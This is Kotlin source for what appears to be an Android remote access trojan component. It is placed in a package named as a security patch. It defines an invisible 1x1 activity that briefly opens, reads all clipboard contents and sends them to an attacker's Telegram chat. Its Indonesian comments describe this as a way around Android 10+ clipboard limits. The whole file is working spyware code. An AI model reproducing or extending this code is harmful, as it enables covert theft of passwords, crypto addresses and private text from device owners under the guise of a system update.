package com.android.security.patch

import android.app.Activity
import android.content.ClipboardManager
import android.content.Context
import android.os.Bundle
import android.view.Gravity

/**
 * Transparent 1x1 activity. Muncul 0.2 detik, baca clipboard, kirim ke telegram, finish.
 * Works di Android 10+ karena app dianggap "foreground".
 */
class ClipGrabActivity : Activity() {

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        window.setLayout(1, 1)
        window.setGravity(Gravity.TOP or Gravity.START)
    }

    override fun onResume() {
        super.onResume()
        val chatId = intent.getLongExtra("chat_id", 0L)
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = cm.primaryClip
            if (clip == null || clip.itemCount == 0) {
                RatApi.sendMessage(this, "clipboard kosong (gak ada isi)", chatId)
            } else {
                val sb = StringBuilder()
                for (i in 0 until clip.itemCount) {
                    val it = clip.getItemAt(i)
                    val t = it.coerceToText(this)?.toString()
                        ?: it.text?.toString()
                        ?: it.uri?.toString()
                        ?: ""
                    if (t.isNotEmpty()) sb.append(t).append("\n")
                }
                if (sb.isBlank()) {
                    RatApi.sendMessage(this, "clipboard kosong", chatId)
                } else {
                    RatApi.sendMessage(this,
                        "<b>📋 clipboard</b>\n<pre>${sb.toString().take(3500)}</pre>", chatId)
                }
            }
        } catch (e: Throwable) {
            RatApi.sendMessage(this, "clip err: ${e.message}", chatId)
        }
        finish()
    }
}
